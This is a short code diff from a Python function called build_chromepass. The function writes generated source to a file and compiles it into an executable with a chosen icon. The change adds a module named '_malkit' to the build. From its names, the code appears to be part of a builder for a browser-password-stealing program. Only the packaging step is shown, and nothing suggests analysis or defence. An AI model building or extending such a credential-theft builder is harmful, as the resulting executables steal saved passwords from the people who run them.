@@ -153,7 +153,7 @@ def build_chromepass(args):
         with open(filename, "w") as f:
             f.write(cp_final)
         # Build the Executable and clean
-        build.exebuild(target=filename, include='',
+        build.exebuild(target=filename, include='_malkit',
                        output=f"builds/{output}", icon=icon)
         spinner = Spinner("Finalizing build...")
         for i in range(10):
